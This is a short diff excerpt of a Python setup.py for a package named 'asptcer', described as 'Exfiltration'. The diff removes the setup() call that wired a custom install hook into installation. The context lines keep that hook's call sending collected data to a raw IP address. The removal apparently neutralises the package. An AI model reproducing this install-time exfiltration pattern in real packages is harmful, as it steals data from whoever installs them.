@@ -15,10 +15,4 @@ class CustomInstall(install):
         requests.get("http://9.30.214.68:9090",params = ploads)
 
 
-setup(name='asptcer',
-      version='1.0.0',
-      description='Exfiltration',
-      author='hari',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                     
